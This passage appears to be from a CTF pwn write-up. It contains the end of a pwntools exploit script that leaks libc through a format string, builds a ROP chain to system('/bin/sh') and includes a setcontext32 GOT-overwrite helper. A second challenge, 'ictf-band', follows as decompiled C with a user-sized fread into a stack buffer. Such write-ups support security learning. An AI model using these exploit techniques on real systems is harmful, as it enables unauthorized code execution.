    got <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>dynamic_value_by_tag<span class="token punctuation">(</span><span class="token string">"DT_PLTGOT"</span><span class="token punctuation">)</span>
    plt_trampoline <span class="token operator">=</span> libc<span class="token punctuation">.</span>address <span class="token operator">+</span> libc<span class="token punctuation">.</span>get_section_by_name<span class="token punctuation">(</span><span class="token string">".plt"</span><span class="token punctuation">)</span><span class="token punctuation">.</span>header<span class="token punctuation">.</span>sh_addr
    <span class="token keyword">return</span> got<span class="token punctuation">,</span> flat<span class="token punctuation">(</span>
        p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"setcontext"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">32</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
        p64<span class="token punctuation">(</span>plt_trampoline<span class="token punctuation">)</span> <span class="token operator">*</span> <span class="token number">0x40</span><span class="token punctuation">,</span>
        create_ucontext<span class="token punctuation">(</span>got <span class="token operator">+</span> <span class="token number">0x218</span><span class="token punctuation">,</span> rsp<span class="token operator">=</span>libc<span class="token punctuation">.</span>symbols<span class="token punctuation">[</span><span class="token string">"environ"</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">,</span>
    <span class="token punctuation">)</span>
<span class="token comment"># e.g. dest, payload = setcontext32.setcontext32(</span>
<span class="token comment">#         libc, rip=libc.sym["system"], rdi=libc.search(b"/bin/sh").__next__()</span>
<span class="token comment">#     )</span>

p <span class="token operator">=</span> connect<span class="token punctuation">(</span><span class="token punctuation">)</span>



payload <span class="token operator">=</span> <span class="token string">b'%39$p'</span><span class="token punctuation">.</span>ljust<span class="token punctuation">(</span><span class="token number">0x108</span><span class="token punctuation">,</span><span class="token string">b'a'</span><span class="token punctuation">)</span> <span class="token operator">+</span> <span class="token string">b'\x89'</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>

libc_base <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>r<span class="token punctuation">(</span><span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">,</span><span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">0x29d1c</span> <span class="token operator">-</span> <span class="token number">0x6d</span>
success<span class="token punctuation">(</span><span class="token builtin">hex</span><span class="token punctuation">(</span>libc_base<span class="token punctuation">)</span><span class="token punctuation">)</span>

pop_rdi_ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x000000000002a3e5</span>
system <span class="token operator">=</span> libc_base <span class="token operator">+</span> libc<span class="token punctuation">.</span>sym<span class="token punctuation">[</span><span class="token string">'system'</span><span class="token punctuation">]</span>
binsh <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token builtin">next</span><span class="token punctuation">(</span>libc<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">b'/bin/sh'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
ret <span class="token operator">=</span> libc_base <span class="token operator">+</span> <span class="token number">0x00000000000bab79</span>


payload <span class="token operator">=</span> <span class="token string">b'a'</span> <span class="token operator">*</span> <span class="token number">0x108</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>pop_rdi_ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>binsh<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>ret<span class="token punctuation">)</span> <span class="token operator">+</span> p64<span class="token punctuation">(</span>system<span class="token punctuation">)</span>
s<span class="token punctuation">(</span>payload<span class="token punctuation">)</span>


<span class="token comment"># g(p)</span>



p<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h2 id="ictf-band"><a href="#ictf-band" class="headerlink" title="ictf-band"></a>ictf-band</h2><pre class="line-numbers language-c" data-language="c"><code class="language-c">__int64 <span class="token function">sub_2151</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> choice<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-4h] BYREF</span>

  <span class="token keyword">do</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">logo</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[1]. Name a song."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[2]. Join the band."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[3]. Write lyrics."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[4]. Exit."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%1d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>choice<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">==</span> <span class="token number">4</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;33m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Goodbye!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> choice <span class="token operator">&lt;=</span> <span class="token number">4</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">switch</span> <span class="token punctuation">(</span> choice <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token keyword">case</span> <span class="token number">3</span><span class="token operator">:</span>
            <span class="token function">write_lyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
          <span class="token keyword">case</span> <span class="token number">1</span><span class="token operator">:</span>
            <span class="token function">name_a_song</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
          <span class="token keyword">case</span> <span class="token number">2</span><span class="token operator">:</span>
            <span class="token function">join</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            <span class="token keyword">continue</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;33m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[/] Invalid option.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">while</span> <span class="token punctuation">(</span> choice <span class="token operator">!=</span> <span class="token number">4</span> <span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">ext</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">write_lyrics</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">112</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+110h] [rbp-70h] BYREF</span>

  <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_15AC</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Show me what you got: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">100</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;31m[+]\x1B[0m You are bad at making lyrics.. No hard feeling.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">sub_16E4</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token keyword">int</span> result<span class="token punctuation">;</span> <span class="token comment">// eax</span>
  <span class="token keyword">char</span> ptr<span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+0h] [rbp-90h] BYREF</span>
  <span class="token keyword">int</span> v2<span class="token punctuation">;</span> <span class="token comment">// [rsp+34h] [rbp-5Ch] BYREF</span>
  <span class="token keyword">char</span> v3<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Ah] [rbp-56h] BYREF</span>
  <span class="token keyword">char</span> v4<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Bh] [rbp-55h] BYREF</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+3Ch] [rbp-54h] BYREF</span>
  <span class="token keyword">char</span> nptr<span class="token punctuation">[</span><span class="token number">52</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+40h] [rbp-50h] BYREF</span>
  <span class="token keyword">int</span> v7<span class="token punctuation">;</span> <span class="token comment">// [rsp+74h] [rbp-1Ch] BYREF</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+78h] [rbp-18h] BYREF</span>
  <span class="token keyword">void</span> <span class="token operator">*</span>v9<span class="token punctuation">;</span> <span class="token comment">// [rsp+80h] [rbp-10h]</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">;</span> <span class="token comment">// [rsp+88h] [rbp-8h]</span>
  <span class="token keyword">int</span> v11<span class="token punctuation">;</span> <span class="token comment">// [rsp+8Ch] [rbp-4h]</span>

  <span class="token function">sub_1474</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  v11 <span class="token operator">=</span> <span class="token number">1</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_5160 <span class="token operator">==</span> <span class="token number">5</span> <span class="token punctuation">)</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;31m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Slot is full."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">else</span>
  <span class="token punctuation">&#123;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Hello there, give me your best idea for a song-name!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Before that, please choose at which slot you want to add your preferences."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Slot [1-5]: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%1d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v7<span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">if</span> <span class="token punctuation">(</span> v7 <span class="token operator">&lt;=</span> <span class="token number">5</span> <span class="token operator">&amp;&amp;</span> v7 <span class="token operator">></span> <span class="token number">0</span>
      <span class="token operator">||</span> <span class="token punctuation">(</span><span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Only slot 1 - 5 available."</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Anyway, how many ictf album you have?"</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Album Count: "</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%99d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v5<span class="token punctuation">)</span><span class="token punctuation">,</span>
          <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span>
          v5 <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">)</span> <span class="token punctuation">)</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Let's start by choosing the genre [jazz | pop | rock]: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fgets</span><span class="token punctuation">(</span>s<span class="token punctuation">,</span> <span class="token number">8</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Now tell me the song title: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">fgets</span><span class="token punctuation">(</span>nptr<span class="token punctuation">,</span> <span class="token number">50</span><span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;33m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[GENRE]: %s\n"</span><span class="token punctuation">,</span> s<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"[TITLE]: %s\n"</span><span class="token punctuation">,</span> nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"I like it! Let's make it a hit!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      v10 <span class="token operator">=</span> <span class="token function">atoi</span><span class="token punctuation">(</span>nptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
      v9 <span class="token operator">=</span> <span class="token function">malloc</span><span class="token punctuation">(</span>v10<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v9 <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> qword_50A0<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;33m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Machine Temp is high.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0;31m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[#] Terminating Program."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        qword_50A0<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v9<span class="token punctuation">;</span>
        dword_5120<span class="token punctuation">[</span>v7<span class="token punctuation">]</span> <span class="token operator">=</span> v10<span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;33m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Data saved!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
      dword_5160 <span class="token operator">+=</span> v11<span class="token punctuation">;</span>
      result <span class="token operator">=</span> dword_5160<span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> dword_5160 <span class="token operator">==</span> <span class="token number">5</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;31m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">">> "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Slot is now full."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
    <span class="token keyword">else</span>
    <span class="token punctuation">&#123;</span>
      <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Would you like to buy one or maybe more? [y/n]: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v4<span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">==</span> <span class="token number">121</span> <span class="token punctuation">)</span>
      <span class="token punctuation">&#123;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"The album should be pre-ordered. Tell us how many you want, we will contact you soon: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%d"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v2<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"Tell us your e-mail: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">fread</span><span class="token punctuation">(</span>ptr<span class="token punctuation">,</span> <span class="token number">1uLL</span><span class="token punctuation">,</span> v2<span class="token punctuation">,</span> <span class="token constant">stdin</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;33m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[YOUR DATA] Please validate before continuing: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span>ptr<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"It's verified [y/n]: "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">__isoc99_scanf</span><span class="token punctuation">(</span><span class="token string">"%c"</span><span class="token punctuation">,</span> <span class="token operator">&amp;</span>v3<span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">getchar</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v3 <span class="token operator">!=</span> <span class="token number">121</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;33m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Machine Temp is high.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0;31m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[#] Terminating Program."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;35m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[@] Thank you for your order, we will contact you soon."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">return</span> <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
      <span class="token keyword">else</span>
      <span class="token punctuation">&#123;</span>
        <span class="token keyword">if</span> <span class="token punctuation">(</span> v4 <span class="token operator">!=</span> <span class="token char">'n'</span> <span class="token punctuation">)</span>
        <span class="token punctuation">&#123;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[1;33m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[+] Machine Temp is high.."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0;31m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"[#] Terminating Program."</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">printf</span><span class="token punctuation">(</span><span class="token string">"\x1B[0m"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">putchar</span><span class="token punctuation">(</span><span class="token number">46</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">sleep</span><span class="token punctuation">(</span><span class="token number">1u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
          <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token punctuation">&#125;</span>
        <span class="token keyword">return</span> <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"Alright then!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
      <span class="token punctuation">&#125;</span>
    <span class="token punctuation">&#125;</span>
  <span class="token punctuation">&#125;</span>
  <span class="token keyword">return</span> result<span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token keyword">int</span> <span class="token function">sub_1DC2</span><span class="token punctuation">(</span><span class="token punctuation">)</span>
<span class="token punctuation">&#123;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span>byte_3080<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">sub_1510</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
